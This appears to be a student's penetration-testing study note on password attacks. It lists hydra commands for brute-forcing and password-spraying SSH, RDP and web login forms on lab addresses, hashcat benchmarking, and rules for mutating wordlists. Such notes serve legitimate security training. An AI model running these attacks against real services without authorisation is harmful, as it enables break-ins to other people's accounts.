[[Notes/Password Attacks|Password Attacks]]

# Attacking Network Service Logins
## SSH and RDP logins
### THC-Hydra
TAGS: #hydra #password-cracking #dictionary-attack #ssh #rdp
```shell
# unzip if it wasn't already
sudo gzip -d rockyou.txt.gz

# simple hydra command
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
```
#### Password Spraying
```shell
# password sparying with a list of usernames
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```
## HTTP POST login forms
```shell
# put things in place after we have intercepted with burp (could utilize burp's intruder?)
# hydra -l ^username^ -P ^password list path^ ^host^ http-post-form "location:var1=^username^:var2=^PASS^:^login_failed_text^"
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

# Password Cracking
```shell
echo -n "secret" | sha256sum #-n for eliminating new line

# wordcount
echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c

# hashcat benchmaerk
hashcat -b
# OR
hashcat.exe -b

# calculate
(($word_count^$password_length)/$hash_rate*100000) = $seconds
```

## Wordlist mutation
```shell
# remove lines start with "1", -i instantanious /^1 start with "1", /d delete
sed -i '/^1/d' wordlist.txt

# rule file to append "1" to the end of each line
echo \$1 > rule.rule

# hashcat in debugging mode with -r for rule sets
hashcat -r demo.rule --stdout wordlist.txt

# capitalize the first letter and add "1" at the end of line
cat rule1.rule
$1 c

# same as above, but it will do the jobs separately
cat rule2.rule
$1
c

# premade rule files for hashcat
ls -la /usr/share/hashcat/rules/

```

# Working with Hashes
